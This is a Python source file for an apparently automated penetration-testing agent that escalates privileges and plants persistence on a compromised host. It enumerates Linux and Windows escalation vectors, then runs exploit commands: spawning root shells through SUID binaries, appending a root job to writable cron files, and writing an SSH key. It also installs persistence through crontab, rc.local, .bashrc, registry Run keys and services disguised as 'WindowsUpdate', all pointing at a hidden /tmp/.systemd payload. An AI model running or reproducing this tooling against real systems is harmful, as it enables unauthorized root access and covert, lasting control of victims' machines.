"""
Privilege Agent - 权限提升Agent
负责权限提升和持久化
"""

import asyncio
import re
import uuid
import subprocess
from datetime import datetime
from typing import Dict, Any, List, Optional, Union
from loguru import logger
from ..core.agent_interface import BaseAgent, AgentRole, AgentState
from ..core.settings import get_settings
from ..knowledge.attack_graph import (
    AttackGraph,
    AttackNode,
    AttackEdge,
    NodeType,
    EdgeType,
)


class DefaultShellExecutor:
    """默认 Shell 执行器 - 用于本地命令执行"""
    
    def __init__(self, timeout: int = 30):
        self.timeout = timeout
    
    async def execute(self, command: str) -> Dict[str, Any]:
        """执行命令"""
        try:
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                process.communicate(), timeout=self.timeout
            )
            return {
                "success": process.returncode == 0,
                "stdout": stdout.decode('utf-8', errors='ignore').strip(),
                "stderr": stderr.decode('utf-8', errors='ignore').strip(),
                "returncode": process.returncode,
            }
        except asyncio.TimeoutError:
            return {"success": False, "error": f"Command timeout ({self.timeout}s)"}
        except Exception as e:
            return {"success": False, "error": str(e)}


class PrivilegeAgent(BaseAgent):
    """
    权限提升Agent
    职责：
    - 检查当前权限
    - 枚举提权向量（动态检测）
    - 执行提权尝试
    - 建立持久化
    """

    LINUX_ESCALATION_METHODS = {
        "sudo": {
            "description": "sudo 权限提升",
            "detect_commands": ["sudo -n -l 2>/dev/null || sudo -l 2>/dev/null"],
            "priority": 1,
            "exploitable_indicators": ["(ALL)", "NOPASSWD"],
        },
        "suid": {
            "description": "SUID 文件提权",
            "detect_commands": [
                "find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null | head -30"
            ],
            "priority": 2,
            "exploitable_bins": [
                "bash",
                "dash",
                "python",
                "python3",
                "perl",
                "php",
                "ruby",
                "node",
            ],
        },
        "capabilities": {
            "description": "Linux Capabilities 提权",
            "detect_commands": [
                "getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_sys_admin'"
            ],
            "priority": 3,
            "exploitable_indicators": ["cap_setuid", "cap_sys_admin"],
        },
        "cron": {
            "description": "可写定时任务提权",
            "detect_commands": [
                "find /etc/cron* -type f -writable 2>/dev/null",
                "find /var/spool/cron/crontabs -type f -writable 2>/dev/null",
            ],
            "priority": 4,
            "exploitable_indicators": [],
        },
        "docker": {
            "description": "Docker 组提权",
            "detect_commands": ["id | grep docker", "docker --version 2>/dev/null"],
            "priority": 5,
            "exploitable_indicators": ["docker"],
        },
        "kernel": {
            "description": "内核漏洞提权",
            "detect_commands": ["uname -a", "cat /proc/version"],
            "priority": 10,
            "exploitable_indicators": [],
        },
    }
    WINDOWS_ESCALATION_METHODS = {
        "always_install_elevated": {
            "description": "AlwaysInstallElevated 注册表项",
            "detect_commands": [
                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            ],
            "priority": 1,
            "exploitable_indicators": ["0x1"],
        },
        "service_path": {
            "description": "未引号服务路径",
            "detect_commands": [
                'wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v "\\""'
            ],
            "priority": 2,
            "exploitable_indicators": [],
        },
        "service_permission": {
            "description": "弱服务权限",
            "detect_commands": [
                'accesschk.exe -uwcqv "Authenticated Users" * /accepteula 2>nul'
            ],
            "priority": 3,
            "exploitable_indicators": [],
        },
        "token": {
            "description": "令牌窃取 (SeImpersonatePrivilege)",
            "detect_commands": ["whoami /priv | findstr /i SeImpersonatePrivilege"],
            "priority": 4,
            "exploitable_indicators": ["SeImpersonatePrivilege", "Enabled"],
        },
        "scheduled_task": {
            "description": "可写计划任务",
            "detect_commands": [
                'schtasks /query /fo LIST /v | findstr /i "Task To Run"'
            ],
            "priority": 5,
            "exploitable_indicators": [],
        },
    }
    LINUX_PERSISTENCE = [
        {"method": "cron", "description": "添加用户级定时任务", "risk": "medium"},
        {"method": "ssh_key", "description": "写入 SSH 公钥", "risk": "high"},
        {"method": "rc_local", "description": "rc.local 启动脚本", "risk": "medium"},
        {"method": "bashrc", "description": "修改 .bashrc", "risk": "medium"},
    ]
    WINDOWS_PERSISTENCE = [
        {"method": "registry_run", "description": "注册表 Run 键", "risk": "high"},
        {"method": "scheduled_task", "description": "创建计划任务", "risk": "high"},
        {"method": "service", "description": "创建 Windows 服务", "risk": "high"},
        {"method": "wmi_event", "description": "WMI 事件订阅", "risk": "medium"},
    ]

    def __init__(
        self,
        name: str = "PrivilegeAgent",
        description: str = "负责权限提升和持久化",
        config: Dict[str, Any] = None,
    ):
        super().__init__(
            name=name, role=AgentRole.PRIVILEGE, description=description, config=config
        )
        self._current_privileges = {}
        self._escalation_vectors = []
        self._os_type = "unknown"
        self._os_info = {}
        self._shell_executor = None
        self._default_timeout = config.get("command_timeout", 30) if config else 30
        self._payload_path = (
            config.get("payload_path", "/tmp/.systemd") if config else "/tmp/.systemd"
        )

        # AttackGraph 初始化
        graph_config = config.get("attack_graph", {}) if config else {}
        settings = get_settings()
        self.attack_graph = AttackGraph(
            name=graph_config.get("name", "pentest_chain"),
            neo4j_uri=graph_config.get("neo4j_uri")
            or settings.neo4j_uri
            or "bolt://localhost:7687",
            neo4j_user=graph_config.get("neo4j_user") or settings.neo4j_user or "neo4j",
            neo4j_password=graph_config.get("neo4j_password")
            or settings.neo4j_password
            or "pentest123",
            use_neo4j=graph_config.get("use_neo4j", True),
        )
        self._attack_graph_initialized = False
        self._entry_credential_id = None

    def set_attack_graph(
        self, attack_graph: AttackGraph, entry_credential_id: str = None
    ):
        """注入外部传入的攻击图（从ExploitAgent继承）"""
        self.attack_graph = attack_graph
        self._attack_graph_initialized = True
        self._entry_credential_id = entry_credential_id
        logger.info(
            f"PrivilegeAgent inherited attack graph, entry: {entry_credential_id}"
        )

    def set_shell_executor(self, shell_executor):
        """注入 shell 执行器对象"""
        self._shell_executor = shell_executor

    async def _execute_command(
        self, command: str, timeout: Optional[int] = None
    ) -> Dict[str, Any]:
        """通过注入的 shell 执行命令"""
        if not self._shell_executor:
            return {"success": False, "error": "No shell executor available"}
        timeout = timeout or self._default_timeout
        try:
            raw_result = await asyncio.wait_for(
                self._shell_executor.execute(command), timeout=timeout
            )
            if isinstance(raw_result, dict):
                output = raw_result.get("output", raw_result.get("stdout", ""))
                error = raw_result.get("error", raw_result.get("stderr", ""))
                success = raw_result.get("success", True)
            else:
                output = str(raw_result)
                error = ""
                success = True
            return {
                "success": success,
                "output": output.strip(),
                "error": error.strip(),
            }
        except asyncio.TimeoutError:
            return {"success": False, "error": f"Command timeout ({timeout}s)"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def execute(
        self, target: str, context: Dict[str, Any] = None
    ) -> Dict[str, Any]:
        self.update_state(AgentState.RUNNING)
        context = context or {}
        if context.get("shell_executor"):
            self.set_shell_executor(context["shell_executor"])
        result = {
            "target": target,
            "initial_access": self._extract_initial_access(context),
            "escalation_methods": [],
            "current_privileges": [],
            "persistence": [],
            "successful_escalation": False,
            "final_privileges": [],
            "attack_graph": None,
        }
        try:
            # 初始化攻击图
            if not self._attack_graph_initialized:
                try:
                    self.attack_graph.initialize()
                    self._attack_graph_initialized = True
                except Exception as e:
                    logger.warning(f"Failed to initialize AttackGraph: {e}")

            # 获取入口凭据ID（从外部传入的attack_graph中提取）
            attack_graph_data = context.get("attack_graph")
            if attack_graph_data:
                if not self._entry_credential_id:
                    self._entry_credential_id = attack_graph_data.get(
                        "entry_credential_id"
                    )
                # 导入外部攻击图数据
                if not self._attack_graph_initialized:
                    self.attack_graph.import_graph(attack_graph_data)
                    self._attack_graph_initialized = True

            logger.info("Step 1: Checking current privileges")
            current_priv = await self._check_current_privileges(context)
            result["current_privileges"] = current_priv
            logger.info("Step 2: Gathering OS information")
            os_info = await self._detect_os()
            self._os_info = os_info
            self._os_type = os_info.get("os_type", "unknown")
            logger.info(
                f"Target OS: {self._os_type} ({os_info.get('os_version', 'unknown')})"
            )
            logger.info("Step 3: Enumerating escalation vectors")
            vectors = await self._enumerate_escalation_vectors()
            self._escalation_vectors = vectors
            result["escalation_methods"] = vectors
            logger.info("Step 4: Attempting privilege escalation")
            escalation_result = await self._execute_escalation(vectors)
            result["successful_escalation"] = escalation_result.get("success", False)
            result["final_privileges"] = escalation_result.get("privileges", [])
            if escalation_result.get("success"):
                logger.info("Step 5: Establishing persistence")
                persistence = await self._establish_persistence()
                result["persistence"] = persistence
                # 记录权限提升到攻击图
                self._record_escalation_to_graph(
                    method=escalation_result.get("method", "unknown"),
                    target_privilege=escalation_result.get("final_privilege", "root"),
                    success=True,
                )

            # 导出攻击图数据
            result["attack_graph"] = self._export_attack_graph()

            self.set_context(result)
            self.update_state(AgentState.COMPLETED)
            return result

        except Exception as e:
            self.update_state(AgentState.FAILED)
            logger.exception(f"Privilege escalation failed: {e}")
            return {
                "target": target,
                "error": str(e),
                "success": False,
                "attack_graph": self._export_attack_graph()
                if self._attack_graph_initialized
                else None,
            }

    def _extract_initial_access(self, context: Dict) -> Dict:
        shells = context.get("shells", [])
        if shells:
            return {
                "method": shells[0].get("shell_type", "unknown"),
                "target": shells[0].get("target", ""),
                "port": shells[0].get("port", 0),
                "service": shells[0].get("service", ""),
            }
        return {}

    async def _check_current_privileges(self, context: Dict) -> List[Dict]:
        privileges = []
        shells = context.get("shells", [])
        for shell in shells:
            privileges.append(
                {
                    "type": shell.get("shell_type", "unknown"),
                    "target": shell.get("target", ""),
                    "status": "obtained",
                }
            )
        if self._shell_executor:
            whoami = await self._execute_command(
                "whoami 2>nul || id -un 2>/dev/null || echo unknown"
            )
            if whoami.get("success"):
                user = whoami.get("output", "").strip()
                privileges.append(
                    {"type": "current_user", "value": user, "status": "checked"}
                )
                if user in ["root", "Administrator", "NT AUTHORITY\\SYSTEM"]:
                    privileges.append(
                        {
                            "type": "privilege_level",
                            "level": "high",
                            "note": "Already elevated",
                        }
                    )
                else:
                    if self._os_type == "linux":
                        sudo_check = await self._execute_command(
                            "sudo -n -l 2>/dev/null | head -1"
                        )
                        if "may run" in sudo_check.get("output", ""):
                            privileges.append({"type": "sudo", "status": "available"})
        if not privileges:
            privileges.append({"type": "unknown", "status": "no_shell"})
        self._current_privileges = {"raw": privileges}
        return privileges

    async def _detect_os(self) -> Dict[str, Any]:
        os_info = {"os_type": "unknown", "os_version": "", "kernel": "", "arch": ""}
        if not self._shell_executor:
            return os_info
        uname_result = await self._execute_command("uname -s 2>/dev/null")
        uname = uname_result.get("output", "").strip().lower()
        if uname and "linux" in uname:
            os_info["os_type"] = "linux"
            kernel = await self._execute_command("uname -r")
            os_info["kernel"] = kernel.get("output", "").strip()
            arch = await self._execute_command("uname -m")
            os_info["arch"] = arch.get("output", "").strip()
            release = await self._execute_command(
                "cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2"
            )
            os_info["os_version"] = release.get("output", "").strip('"')
        elif uname and "darwin" in uname:
            os_info["os_type"] = "macos"
            sw_vers = await self._execute_command("sw_vers -productVersion")
            os_info["os_version"] = sw_vers.get("output", "").strip()
        else:
            ver_result = await self._execute_command("ver")
            if ver_result.get("success"):
                ver_output = ver_result.get("output", "").lower()
                if "windows" in ver_output or "microsoft" in ver_output:
                    os_info["os_type"] = "windows"
                    os_info["os_version"] = ver_result.get("output", "").strip()
                    arch = await self._execute_command("echo %PROCESSOR_ARCHITECTURE%")
                    os_info["arch"] = arch.get("output", "").strip()
        return os_info

    async def _enumerate_escalation_vectors(self) -> List[Dict]:
        vectors = []
        methods = (
            self.LINUX_ESCALATION_METHODS
            if self._os_type == "linux"
            else self.WINDOWS_ESCALATION_METHODS
        )
        for method, details in methods.items():
            vector = {
                "method": method,
                "description": details.get("description", ""),
                "priority": details.get("priority", 99),
                "exploitable": False,
                "detection_output": "",
            }
            detect_cmds = details.get("detect_commands", [])
            for cmd in detect_cmds:
                result = await self._execute_command(cmd, timeout=15)
                if result.get("success"):
                    output = result.get("output", "")
                    vector["detection_output"] = output[:500]
                    if self._is_method_exploitable(method, output, details):
                        vector["exploitable"] = True
                        break
            vectors.append(vector)
        vectors.sort(key=lambda x: x["priority"])
        return vectors

    def _is_method_exploitable(self, method: str, output: str, details: Dict) -> bool:
        if not output:
            return False
        output_lower = output.lower()
        indicators = details.get("exploitable_indicators", [])
        for ind in indicators:
            if ind.lower() in output_lower:
                return True
        if method == "suid":
            exploitable_bins = details.get("exploitable_bins", [])
            for bin_name in exploitable_bins:
                if re.search(rf"/{bin_name}\s", output_lower):
                    return True
        if method == "cron":
            return len(output.strip()) > 0
        if method == "docker":
            return "docker" in output_lower
        return len(output.strip()) > 10

    async def _execute_escalation(self, vectors: List[Dict]) -> Dict[str, Any]:
        result = {"success": False, "methods_attempted": [], "privileges": []}
        exploitable = [v for v in vectors if v.get("exploitable")]
        if not exploitable:
            logger.info("No exploitable vectors found")
            return result
        for vector in exploitable:
            method = vector["method"]
            logger.info(f"Attempting escalation via {method}")
            attempt = {
                "method": method,
                "description": vector["description"],
                "status": "failed",
                "output": "",
            }
            exploit_cmd = self._generate_exploit_command(method, vector)
            if exploit_cmd:
                cmd_result = await self._execute_command(exploit_cmd, timeout=60)
                attempt["output"] = cmd_result.get("output", "")[:500]
                if self._check_escalation_success(cmd_result.get("output", "")):
                    attempt["status"] = "success"
                    result["success"] = True
                    result["privileges"].append(
                        {
                            "method": method,
                            "level": "elevated",
                            "evidence": cmd_result.get("output", "")[:200],
                        }
                    )
                    result["methods_attempted"].append(attempt)
                    logger.info(f"Escalation successful via {method}")
                    break
                else:
                    check = await self._execute_command("whoami 2>nul || id -un")
                    if "root" in check.get("output", "") or "SYSTEM" in check.get(
                        "output", ""
                    ):
                        attempt["status"] = "success"
                        result["success"] = True
                        result["privileges"].append(
                            {"method": method, "level": "elevated"}
                        )
                        result["methods_attempted"].append(attempt)
                        break
            result["methods_attempted"].append(attempt)
        if not result["success"]:
            who = await self._execute_command("whoami 2>nul || id -un")
            result["privileges"].append(
                {"method": "initial", "level": who.get("output", "unknown").strip()}
            )
        return result

    def _generate_exploit_command(self, method: str, vector: Dict) -> Optional[str]:
        output = vector.get("detection_output", "")
        if self._os_type == "linux":
            if method == "sudo":
                return "sudo -n /bin/sh -c 'id; echo SUDO_SUCCESS'"
            elif method == "suid":
                bins = ["bash", "dash", "python3", "python", "perl"]
                for bin_name in bins:
                    if re.search(rf"/{bin_name}\s", output):
                        if bin_name in ["bash", "dash", "sh"]:
                            return f"{bin_name} -p -c 'id; echo SUID_SUCCESS'"
                        elif bin_name.startswith("python"):
                            return f"{bin_name} -c 'import os; os.system(\"id; echo SUID_SUCCESS\")'"
                        elif bin_name == "perl":
                            return f"{bin_name} -e 'exec \"/bin/sh -i\"'"
                return None
            elif method == "docker":
                return "docker ps 2>/dev/null && echo DOCKER_SUCCESS"
            elif method == "cron":
                writable_files = output.strip().split("\n")
                if writable_files:
                    cron_file = writable_files[0].strip()
                    payload = f"* * * * * root {self._payload_path}"
                    return f"echo '{payload}' >> {cron_file} && echo CRON_SUCCESS"
            elif method == "kernel":
                return None
        else:
            if method == "token":
                return "whoami /priv"
            return None
        return None

    def _check_escalation_success(self, output: str) -> bool:
        if not output:
            return False
        output_lower = output.lower()
        indicators = [
            "uid=0",
            "root",
            "suid_success",
            "docker_success",
            "nt authority\\system",
            "system",
            "cron_success",
        ]
        return any(ind in output_lower for ind in indicators)

    async def _establish_persistence(self) -> List[Dict]:
        persistence = []
        methods = (
            self.LINUX_PERSISTENCE
            if self._os_type == "linux"
            else self.WINDOWS_PERSISTENCE
        )
        for method_info in methods[:2]:
            method = method_info["method"]
            commands = self._get_persistence_commands(method)
            success = False
            output = ""
            for cmd in commands:
                result = await self._execute_command(cmd)
                if (
                    result.get("success")
                    and "error" not in result.get("output", "").lower()
                ):
                    success = True
                    output = result.get("output", "")[:200]
                    break
            persistence.append(
                {
                    "method": method,
                    "description": method_info["description"],
                    "risk": method_info["risk"],
                    "status": "configured" if success else "failed",
                    "output": output,
                }
            )
        return persistence

    def _get_persistence_commands(self, method: str) -> List[str]:
        payload = self._payload_path
        if self._os_type == "linux":
            commands = {
                "cron": [
                    f"(crontab -l 2>/dev/null; echo '*/5 * * * * {payload}') | crontab -"
                ],
                "ssh_key": [
                    "mkdir -p ~/.ssh",
                    f"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...' >> ~/.ssh/authorized_keys",
                ],
                "rc_local": [f"echo '{payload} &' >> /etc/rc.local"],
                "bashrc": [f"echo '{payload} &' >> ~/.bashrc"],
            }
        else:
            commands = {
                "registry_run": [
                    f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "{payload}" /f'
                ],
                "scheduled_task": [
                    f'schtasks /create /tn "WindowsUpdate" /tr "{payload}" /sc ONLOGON /f'
                ],
                "service": [f'sc create "WinUpdater" binPath= "{payload}" start= auto'],
                "wmi_event": [
                    f'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="Updater", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
                ],
            }
        return commands.get(method, [])

    def validate_result(self, result: Dict[str, Any]) -> bool:
        if not result:
            return False
        if result.get("error") and not result.get("success", True):
            return False
        return "target" in result

    def _record_escalation_to_graph(
        self, method: str, target_privilege: str, success: bool = True
    ) -> None:
        """记录权限提升到攻击图"""
        if not self._attack_graph_initialized:
            return

        source_id = self._entry_credential_id or "unknown_credential"

        priv_id = f"priv_{method}_{target_privilege}_{uuid.uuid4().hex[:8]}"
        priv_node = AttackNode(
            id=priv_id,
            node_type=NodeType.PRIVILEGE,
            name=f"{method} -> {target_privilege}",
            properties={
                "method": method,
                "target_privilege": target_privilege,
                "success": success,
                "escalated_at": datetime.now().isoformat(),
            },
        )
        self.attack_graph.add_node(priv_node)

        edge_id = f"{source_id}:{priv_id}"
        edge = AttackEdge(
            id=edge_id,
            source_id=source_id,
            target_id=priv_id,
            edge_type=EdgeType.LEADS_TO,
            properties={"method": method, "success": success},
        )
        self.attack_graph.add_edge(edge)
        logger.info(f"Recorded privilege escalation to graph: {source_id} -> {priv_id}")

    def _export_attack_graph(self) -> Dict[str, Any]:
        """导出攻击图数据"""
        if not self._attack_graph_initialized:
            return {}
        graph_data = self.attack_graph.export_graph()
        return {
            "node_count": len(graph_data.get("nodes", [])),
            "edge_count": len(graph_data.get("edges", [])),
            "nodes": graph_data.get("nodes", []),
            "edges": graph_data.get("edges", []),
            "use_neo4j": self.attack_graph.use_neo4j,
        }

    def report(self) -> Dict[str, Any]:
        ctx = self._context or {}
        exploitable_count = len(
            [v for v in ctx.get("escalation_methods", []) if v.get("exploitable")]
        )
        return {
            "agent": self.name,
            "role": self.role.value,
            "state": self.state.value,
            "description": self.description,
            "summary": {
                "initial_access": ctx.get("initial_access", {}),
                "os_type": self._os_type,
                "escalation_methods_count": len(ctx.get("escalation_methods", [])),
                "exploitable_count": exploitable_count,
                "successful_escalation": ctx.get("successful_escalation", False),
                "persistence_methods_count": len(ctx.get("persistence", [])),
            },
            "last_result": ctx,
        }
